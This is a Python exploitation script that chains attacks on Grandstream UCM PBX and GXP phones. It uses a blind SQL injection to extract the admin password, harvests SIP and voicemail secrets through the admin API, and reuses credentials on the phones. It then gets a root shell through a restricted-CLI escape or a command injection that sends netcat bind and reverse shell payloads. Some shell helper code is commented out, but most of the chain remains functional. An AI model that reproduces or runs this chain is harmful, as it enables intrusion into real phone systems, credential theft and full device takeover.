#!/usr/bin/env python3
"""
grandstream_chain.py — automated Grandstream UCM/GXP exploitation chain

Chain (verified against UCM6510 fw 1.0.18.13 + GXP1625 fw 1.0.7.11):
  1. Fingerprint phone (GXP) + unauth SIP account leak -> discover PBX
  2. Fingerprint PBX (UCM) via /cgi action=getInfo (unauth version)
  3. CVE-2020-5726 CTI blind SQLi (TCP 8888) -> admin password
     (SQLite "--" needs trailing space; binary-search extraction)
  4. UCM web login: action=challenge + token=md5(challenge+password)
  5. UCM admin API: listAccount + getSipAccount -> SIP credentials
  6. Credential reuse -> GXP phone web admin (dologin)
  7. Optional shell: CVE-2020-5722 sendPasswordEmail RCE (bind/reverse)
     or SSH (paramiko, legacy host keys)

Usage:
  python grandstream_chain.py --phone 10.20.0.108
  python grandstream_chain.py --phone 10.20.0.108 --shell bind --bind-port 4444
  python grandstream_chain.py --phone 10.20.0.108 --shell reverse --lhost 10.20.2.177
  python grandstream_chain.py --phone 10.20.0.108 --skip-sqli --password whatever it is
"""

import argparse
import hashlib
import json
import os
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

os.system("")  # enable ANSI escape sequences on Windows terminals

# --- Banner ---

telephone = (
    "\033[92m"  # bright green
    + r"""
                              ._______                           .
                     __m=q~5~5''''\\~5~5\q=L__
              ._m=(~5'''''''''''''\\~5~q=L_
          _j=(~'''''''''''''''''''\\~N=_,
      ._q~''''''''''''''''''''''''(~q_
     j~''''''''''L+=+/~~~~~~~~\=tL'''''''''\L
     |''''''\LmN''\|               |'\DL!''''''\V
    .t''''''|  |'''N=q=q=q=q=q=q=q=t''| `\''''''4
    `|'''''\  _+''''''''''''\+_ .!'''''\V
    .b'''''LL4D(''''''''''''''\~N4qLL'''''|
 .q5D~L''LL=fTL('''''''''''''''''\~qJ~+qLL''r'
 t    `~' .q~'''''''''''''''''''\\, `~+f'
:ftT-       b''''''q+=+=+L\=+=+=N\D=+=+q''''''4
\*b       :''''''\V     |4     |'|    |'''''\V
.*\V       |''''''4=q=q=tYq=q=q+\+q=q=4''''''4
V\*L       |''''''\V~~~~~|4~~~~~V'P~~~~V'''''\V
.Z\V       |''''''4     bV     |\|    |''''''\|
(\G!       |''''''\~5~5~5'(~5~5~5'5~5~5~''''''|
`GLV       /''''''4~~~~~bV~~~~~V\P~~~~V''''''\|
|\Z       b''''''\V     |4     |'|    |''''''|
`NLY;      |''''''(XKXKXbTKXKXKX\XKXKXK''''''\|
|t'W'      b''''''\V     |4     |'|    |''''''4
!tK\       |''''''4_____bV_____d\b____d''''''\V
|t'q'     .t'''''''''''''''''''''''4
`bq+\     |'''''''''''''''''''''''\V
 :'\8    jV'''''''''''''''''''''''4
 !\Gq~q/(\4''''''''''''''''''''''''|
   !Lq'\)'!=+=N'''4~~~~~~~~~~~~~~~~~~~~~~~~~b'''\D=+=!
     ~/'      |LLLLLL8                         bLLLLLL|
------------------------------------------------"""
    + "\033[0m"  # reset
)

# HTTP helpers

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


class Http:
    """Session-aware HTTP helper (cookies kept, TLS verified off)."""

    def __init__(self, base, timeout=12):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.cookies = {}

    def _cookie_header(self):
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def request(self, path, params=None, method="POST", headers=None, raw_body=None):
        url = self.base + path
        hdrs = {"User-Agent": "Mozilla/5.0", "Referer": self.base + "/"}
        if self.cookies:
            hdrs["Cookie"] = self._cookie_header()
        if headers:
            hdrs.update(headers)
        if raw_body is not None:
            data = raw_body
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif params is not None:
            data = urllib.parse.urlencode(params).encode()
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        else:
            data = None
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=CTX) as r:
                body = r.read().decode("utf-8", "replace")
                for c in r.headers.get_all("Set-Cookie") or []:
                    name, _, rest = c.partition("=")
                    value = rest.split(";")[0]
                    self.cookies[name.strip()] = value
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
        except Exception as e:
            return None, str(e), {}


def tcp_connect(host, port, timeout=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    return s


# GXP phone

class GxpPhone:
    def __init__(self, ip, timeout=10):
        self.ip = ip
        self.base = f"http://{ip}"
        self.http = Http(self.base, timeout)
        self.sid = None

    def api(self, path, params=None, method="POST"):
        return self.http.request(path, params, method)

    # -- unauthenticated ------------------------------------------------
    def fingerprint(self):
        info = {"ip": self.ip}
        st, body, _ = self.api("/cgi-bin/api.values.get",
                               {"request": "68:phone_model:8468:28116", "sid": ""})
        if st == 200:
            try:
                d = json.loads(body)
                if d.get("response") == "success":
                    info["firmware"] = d["body"].get("68")
                    info["model"] = d["body"].get("phone_model")
            except Exception:
                pass
        st, body, _ = self.api("/cgi-bin/api-get_accounts", None, "GET")
        if st == 200:
            try:
                d = json.loads(body)
                accts = d.get("body") or []
                for a in accts:
                    if a.get("sip_server"):
                        info["sip_server"] = a["sip_server"]
                        info["sip_id"] = a.get("sip_id")
                        info["account_name"] = a.get("name")
                        info["registered"] = a.get("reg")
                        break
            except Exception:
                pass
        return info

    def lockout_status(self):
        st, body, _ = self.api("/cgi-bin/api-get_lockout", None, "GET")
        if st == 200 and "success" in body:
            return "locked" if '"lockout"' in body else "ok"
        return "unknown"

    # -- login -----------------------------------------------------------
    def login(self, username, password):
        """Returns (ok, role_or_error)."""
        st, body, _ = self.api("/cgi-bin/dologin",
                               {"username": username, "password": password})
        if st == 200:
            try:
                d = json.loads(body)
                if d.get("response") == "success":
                    self.sid = d["body"].get("sid")
                    return True, d["body"].get("role")
                return False, d.get("body")
            except Exception:
                return False, body[:80]
        return False, f"HTTP {st}"

    # -- authenticated ----------------------------------------------------
    def get_values(self, keys):
        if not self.sid:
            return {}
        params = {"request": ":".join(str(k) for k in keys), "sid": self.sid}
        st, body, _ = self.api("/cgi-bin/api.values.get", params)
        if st == 200:
            try:
                d = json.loads(body)
                if d.get("response") == "success":
                    return d.get("body", {})
            except Exception:
                pass
        return {}

    def config_summary(self):
        v = self.get_values(["67", "68", "89", "917", "1397", "36", "47", "270",
                             "10", "12", "13", "14", "15", "40"])
        return v

    def sys_status(self):
        st, body, _ = self.api("/cgi-bin/api-get_system_status", {"sid": self.sid})
        return body if st == 200 else f"HTTP {st}"


# UCM CTI blind SQLi (CVE-2020-5726)

class UcmCti:
    def __init__(self, ip, port=8888, timeout=6):
        self.ip = ip
        self.port = port
        self.timeout = timeout

    def _send(self, payload):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        try:
            s.connect((self.ip, self.port))
            s.sendall(struct.pack(">I", len(payload)) + payload)
            ln = s.recv(4)
            if len(ln) < 4:
                return None
            n = struct.unpack(">I", ln)[0]
            data = b""
            while len(data) < n:
                c = s.recv(n - len(data))
                if not c:
                    break
                data += c
            try:
                return json.loads(data)
            except Exception:
                return None
        except Exception:
            return None
        finally:
            s.close()

    def oracle(self, cond, user="admin"):
        payload = f"action=challenge&user={user}' AND {cond}-- ".encode()
        r = self._send(payload)
        return r is not None and r.get("status") == 0

    @staticmethod
    def _esc(s):
        return s.replace("'", "''")

    def extract(self, subq, maxlen=80, label=""):
        """Blind-extract a single string via binary search. Returns None if not found."""
        L = None
        for n in range(0, maxlen + 1):
            if self.oracle(f"LENGTH(({subq}))={n}"):
                L = n
                break
        if L is None:
            return None
        if L == 0:
            return ""
        out = ""
        for pos in range(1, L + 1):
            lo, hi = 0x20, 0x7E
            while lo < hi:
                mid = (lo + hi) // 2
                if self.oracle(f"substr(({subq}),{pos},1) >= '{self._esc(chr(mid))}'"):
                    lo = mid + 1
                else:
                    hi = mid
            ch = chr(lo - 1) if lo > 0x20 else "?"
            out += ch
            sys.stdout.write(f"\r  [{label}] {pos}/{L}: {out!r}   ")
            sys.stdout.flush()
        sys.stdout.write("\n")
        return out

    def get_admin_password(self):
        """Extract admin user_password from the CTI challenge table.

        NOTE: no FROM clause — this reads the OUTER challenge query's table
        (the web/CTI login credential). The `users` table has a decoy admin
        row with a different password.
        """
        if not self.oracle("user_name='admin'"):
            return None
        return self.extract("user_password", 40, "cti-admin")

    def dump_users_table(self, limit=40):
        """Dump user_name/user_password/privilege from the users table."""
        rows = []
        for i in range(limit):
            un = self.extract(f"SELECT user_name FROM users LIMIT 1 OFFSET {i}", 30, f"u{i}")
            if un is None:
                break
            pw = self.extract(f"SELECT user_password FROM users LIMIT 1 OFFSET {i}", 40, f"p{i}")
            pr = self.extract(f"SELECT privilege FROM users LIMIT 1 OFFSET {i}", 6, f"r{i}")
            rows.append((un, pw, pr))
        return rows


# UCM web (HTTPS 8089)

class UcmWeb:
    def __init__(self, ip, port=8089, timeout=12):
        self.ip = ip
        self.base = f"https://{ip}:{port}"
        self.http = Http(self.base, timeout)
        self.session = None

    def get_info(self):
        """Unauth model/version via action=getInfo."""
        st, body, _ = self.http.request("/cgi?", {"action": "getInfo"})
        if st == 200:
            try:
                d = json.loads(body)
                r = d.get("response") or {}
                return {"model": r.get("model_name"), "version": r.get("prog_version"),
                        "country": r.get("country")}
            except Exception:
                pass
        return {}

    def login(self, username, password):
        """Challenge + md5(challenge+password) token login. Returns True on success."""
        st, body, _ = self.http.request("/cgi?", {"action": "challenge", "user": username})
        if st != 200:
            return False, f"challenge HTTP {st}"
        try:
            challenge = json.loads(body)["response"]["challenge"]
        except Exception:
            return False, "no challenge"
        token = hashlib.md5((challenge + password).encode()).hexdigest()
        st, body, _ = self.http.request("/cgi?", {"action": "login", "user": username,
                                                  "token": token})
        if st == 200:
            try:
                d = json.loads(body)
                if d.get("status") == 0:
                    self.session = username
                    return True, "admin"
                return False, f"status {d.get('status')} {d.get('response')}"
            except Exception:
                return False, body[:80]
        return False, f"HTTP {st}"

    def api(self, params):
        st, body, _ = self.http.request("/cgi?", params)
        if st == 200:
            try:
                return json.loads(body)
            except Exception:
                return {"raw": body}
        return {"error": f"HTTP {st}"}

    def list_accounts(self):
        d = self.api({"action": "listAccount"})
        return (d.get("response") or {}).get("account") or []

    def get_sip_account(self, extension):
        d = self.api({"action": "getSipAccount", "extension": extension})
        return (d.get("response") or {}).get("extension") or {}

    def get_user(self, user_name):
        d = self.api({"action": "getUser", "user_name": user_name})
        return (d.get("response") or {}).get(user_name) or {}

    # -- CVE-2020-5722 RCE ----------------------------------------------
    def sendemail_rce(self, cmd):
        """Forgot-password SQLi + command injection. Rate-limited ~60s/call."""
        rand = str(int(time.time()) % 100000)
        user_name = f"' or {rand}={rand}--`;`{cmd}`;`"
        st, body, _ = self.http.request("/cgi?", {"action": "sendPasswordEmail",
                                                  "user_name": user_name})
        if st == 200:
            try:
                d = json.loads(body)
                return d.get("status") == 0, body[:120]
            except Exception:
                return True, body[:120]
        return st == 200, f"HTTP {st}"


# SSH (paramiko optional) — UCM restricted CLI escape (CVE-2020-5759)

def ssh_ucm_shell(host, user, password, timeout=12, port=22):
    """UCM SSH: dropbear -> restricted 'UCM6500 >' CLI -> config ->
    'unset a;/bin/sh' command injection (CVE-2020-5759) -> root busybox sh.
    Returns (channel, transport, error)."""
    t = None
    try:
        import paramiko
    except ImportError:
        return None, None, "paramiko not installed (pip install 'paramiko<5')"
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(25)
        t = paramiko.Transport(sock)
        t._preferred_keys = ("ssh-rsa", "ssh-dss", "rsa-sha2-512", "rsa-sha2-256")
        t.banner_timeout = 10
        t.connect(username=user, password=password)
        ch = t.open_session()
        ch.get_pty(term="xterm")
        ch.settimeout(2)
        ch.invoke_shell()
        time.sleep(1.2)
        ch.recv(65536)            # 'UCM6500 > ' banner
        ch.send("config\r")
        time.sleep(1.0)
        ch.recv(65536)            # 'CONFIG > ' prompt
        ch.send("unset a;/bin/sh\r")
        time.sleep(1.5)
        ch.recv(65536)            # drop into '~ # '
        return ch, t, None
    except Exception as e:
        try:
            t.close()
        except Exception:
            pass
        return None, None, f"{type(e).__name__}: {e}"


def ssh_shell_exec(host, user, password, cmd, timeout=15, port=22):
    """One-shot root command on the UCM via the CLI escape. Returns (ok, output)."""
    ch, t, err = ssh_ucm_shell(host, user, password, port=port)
    if ch is None:
        return False, err
    try:
        ch.send(cmd + "\n")
        time.sleep(2)
        out = b""
        try:
            while True:
                c = ch.recv(65536)
                if not c:
                    break
                out += c
        except socket.timeout:
            pass
        return True, out.decode("utf-8", "replace")
    finally:
        try:
            t.close()
        except Exception:
            pass


# Shell helpers, i purposely removeed the main codes, and left this scrap , skiddie gateway
"""
def bind_shell_listener(ip, port, timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection((ip, port), timeout=5)
            print(f"[+] connected to bind shell {ip}:{port}")
            return s
        except Exception:
            time.sleep(2)
    return None


def interactive(sock):
    import select
    print("[*] interactive shell (type 'exit' to quit)")
    sock.settimeout(0.2)
    while True:
        try:
            ready, _, _ = select.select([sock], [], [], 0.3)
            if ready:
                data = sock.recv(4096)
                if not data:
                    print("[*] connection closed")
                    break
                sys.stdout.write(data.decode("utf-8", "replace"))
                sys.stdout.flush()
        except OSError:
            break
        except KeyboardInterrupt:
            break
    sock.close()


def detect_lhost():
    try:
        import subprocess
        out = subprocess.check_output(["ipconfig"], encoding="utf-8", errors="replace")
        import re
        addrs = re.findall(r"IPv4[^:]*:\s*([0-9.]+)", out)
        for a in addrs:
            if a.startswith("10.") or a.startswith("172.") or a.startswith("192.168."):
                return a
    except Exception:
        pass
    return None
"""

# Main chain

def banner():
    print(telephone)
    print("=" * 72)
    print(" Grandstream UCM/GXP chain — CTI SQLi -> admin -> phones -> shell")
    print("=" * 72)


def run(args):
    banner()
    results = {"phone": {}, "pbx": {}, "creds": {}}

    # 1. phone fingerprint + unauth leak
    print(f"\n[1] Phone fingerprint: {args.phone}")
    phone = GxpPhone(args.phone, args.timeout)
    info = phone.fingerprint()
    results["phone"]["info"] = info
    print(f"    model={info.get('model')} fw={info.get('firmware')} "
          f"sip_server={info.get('sip_server')} sip_id={info.get('sip_id')} "
          f"account={info.get('account_name')} reg={info.get('registered')}")

    pbx_ip = args.pbx or info.get("sip_server")
    if not pbx_ip:
        print("[-] cannot determine PBX; use --pbx")
        return results
    print(f"    -> PBX at {pbx_ip}")

    # 2. PBX fingerprint
    print(f"\n[2] PBX fingerprint: {pbx_ip}")
    ucm = UcmWeb(pbx_ip, args.pbx_port, args.timeout)
    g = ucm.get_info()
    results["pbx"]["info"] = g
    print(f"    model={g.get('model')} version={g.get('version')} country={g.get('country')}")

    # 3. CTI blind SQLi -> admin password
    print(f"\n[3] CTI blind SQLi (CVE-2020-5726) on {pbx_ip}:8888")
    cti = UcmCti(pbx_ip, args.cti_port, args.timeout)
    if args.skip_sqli:
        admin_pw = args.password
        print(f"    skipped (using --password {admin_pw!r})")
    else:
        t0 = time.time()
        if not cti.oracle("LENGTH(user_password)>0"):
            print("    [-] injection not confirmed (patched or wrong oracle?)")
            admin_pw = args.password
        else:
            admin_pw = cti.get_admin_password()
            print(f"    [+] admin user_password (challenge table) = {admin_pw!r} "
                  f"({time.time()-t0:.1f}s)")
    results["creds"]["ucm_admin_password"] = admin_pw
    if not admin_pw:
        print("[-] no admin password; abort")
        return results

    # 4. UCM web login
    print(f"\n[4] UCM web login: admin / {admin_pw!r}")
    ok, role = ucm.login(args.user, admin_pw)
    print(f"    {'[+] logged in' if ok else '[-] login failed'} role={role}")
    if not ok:
        print("    note: challenge-table password may differ from web password; "
              "try --password <users-table-admin>")
        return results

    # 5. extension creds
    print("\n[5] Extension / SIP credentials")
    accts = ucm.list_accounts()
    ext = None
    for a in accts:
        if a.get("addr", "").startswith(args.phone) or str(a.get("extension")) == str(args.sip_id or ""):
            ext = a.get("extension")
            print(f"    phone account: ext {ext} {a.get('fullname')} @ {a.get('addr')}")
            break
    if not ext:
        ext = args.sip_id or (accts[0]["extension"] if accts else None)
        print(f"    using extension {ext}")
    sip = ucm.get_sip_account(ext) if ext else {}
    if sip:
        results["creds"]["sip"] = {"extension": ext, "authid": sip.get("authid"),
                                   "secret": sip.get("secret"),
                                   "vmsecret": sip.get("vmsecret")}
        print(f"    SIP authid={sip.get('authid')} secret={sip.get('secret')} "
              f"vmsecret={sip.get('vmsecret')}")

    # 6. phone login (credential reuse)
    print(f"\n[6] Phone web login (credential reuse)")
    cands = [admin_pw, sip.get("secret"), args.password] if args.password else [admin_pw, sip.get("secret")]
    phone_ok = False
    for pw in dict.fromkeys([c for c in cands if c]):
        if phone.lockout_status() == "locked":
            print("    [!] phone login locked out — wait 5 min or skip")
            break
        ok2, role2 = phone.login(args.user, pw)
        if ok2:
            print(f"    [+] phone admin login: {args.user} / {pw!r} role={role2}")
            results["creds"]["phone_admin"] = {"user": args.user, "password": pw,
                                               "sid": phone.sid}
            phone_ok = True
            break
        print(f"    - {args.user}/{pw!r}: {role2}")
        time.sleep(1)
    if phone_ok:
        cfg = phone.config_summary()
        results["phone"]["config"] = cfg
        print(f"    phone: MAC={cfg.get('67')} serial={cfg.get('1397')} "
              f"authid={cfg.get('36')} sip_server={cfg.get('47')} "
              f"name={cfg.get('270')} fw={cfg.get('68')}")

    # optional: full users table dump
    if args.dump_users and not args.skip_sqli:
        print("\n[+] dumping users table via CTI SQLi...")
        rows = cti.dump_users_table(40)
        results["creds"]["users_table"] = rows
        for un, pw, pr in rows:
            print(f"    {un!r:12} privilege={pr!r} password={pw!r}")

    # 7. shell
    if args.shell and args.shell != "none":
        print(f"\n[7] Shell attempt: {args.shell}")
        if args.shell in ("ssh", "all"):
            print(f"    SSH {args.ssh_user}/{admin_pw!r} -> UCM CLI escape (CVE-2020-5759)")
            ok3, out = ssh_shell_exec(pbx_ip, args.ssh_user, admin_pw,
                                      "id; uname -a; cat /proc/version; ls / | head")
            if ok3 and "uid=" in out:
                print(f"    [+] ROOT SHELL via 'unset a;/bin/sh'")
                print(out.strip()[:800])
                results["shell"] = "ssh-ucm-cli"
            else:
                print(f"    [-] no shell: {out[:200]}")
        if args.shell in ("bind", "all"):
            cmd = f"nc -l -p {args.bind_port} -e /bin/sh"
            print(f"    sending bind-shell RCE: {cmd!r} (rate-limited 60s)")
            ok4, resp = ucm.sendemail_rce(cmd)
            print(f"    sendPasswordEmail: ok={ok4} {resp[:80]}")
            sock = bind_shell_listener(pbx_ip, args.bind_port, args.bind_timeout)
            if sock:
                print("[+] SHELL acquired")
                results["shell"] = "bind"
                interactive(sock)
            else:
                print("[-] bind shell not reachable (nc variant? try --shell reverse or SSH)")
        if args.shell in ("reverse", "all"):
            lhost = args.lhost or detect_lhost()
            if not lhost:
                print("[-] cannot detect local IP; pass --lhost")
            else:
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind(("0.0.0.0", args.lport))
                listener.listen(1)
                listener.settimeout(args.bind_timeout)
                print(f"    listener on {lhost}:{args.lport}; sending reverse-shell RCE")
                cmd = f"nc {lhost} {args.lport} -e /bin/sh"
                ok5, resp = ucm.sendemail_rce(cmd)
                print(f"    sendPasswordEmail: ok={ok5} {resp[:80]}")
                try:
                    conn, addr = listener.accept()
                    print(f"[+] SHELL acquired from {addr}")
                    results["shell"] = "reverse"
                    interactive(conn)
                except socket.timeout:
                    print("[-] no reverse connection (nc missing on target?)")
                finally:
                    listener.close()

    # summary
    print("\n" + "=" * 72)
    print("SUMMARY")
    print("=" * 72)
    print(f"  Phone {args.phone}: {results['phone']['info']}")
    if results["creds"].get("ucm_admin_password"):
        print(f"  UCM admin: {args.user} / {results['creds']['ucm_admin_password']}")
    if results["creds"].get("phone_admin"):
        c = results["creds"]["phone_admin"]
        print(f"  Phone admin: {c['user']} / {c['password']}")
    if results["creds"].get("sip"):
        s = results["creds"]["sip"]
        print(f"  SIP ext {s['extension']}: authid={s['authid']} secret={s['secret']}")
    if results.get("shell"):
        print(f"  SHELL: {results['shell']}")
    return results


def main():
    p = argparse.ArgumentParser(description="Grandstream UCM/GXP exploitation chain")
    p.add_argument("--phone", default="10.20.0.0", help="GXP phone IP")
    p.add_argument("--pbx", default=None, help="UCM PBX IP (auto from phone)")
    p.add_argument("--pbx-port", type=int, default=8089)
    p.add_argument("--cti-port", type=int, default=8888)
    p.add_argument("--user", default="admin")
    p.add_argument("--password", default=None, help="known admin password (skips SQLi)")
    p.add_argument("--skip-sqli", action="store_true", help="skip CTI SQLi extraction")
    p.add_argument("--sip-id", default=None, help="phone extension (auto)")
    p.add_argument("--dump-users", action="store_true", help="dump users table via SQLi")
    p.add_argument("--shell", choices=["none", "ssh", "bind", "reverse", "all"],
                   default="none", help="attempt a shell")
    p.add_argument("--ssh-user", default="root")
    #p.add_argument("--bind-port", type=int, default=4444)
    #p.add_argument("--lhost", default=None, help="reverse-shell listener IP")
    #p.add_argument("--lport", type=int, default=4444)
    #p.add_argument("--bind-timeout", type=int, default=40)
    p.add_argument("--timeout", type=int, default=10)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
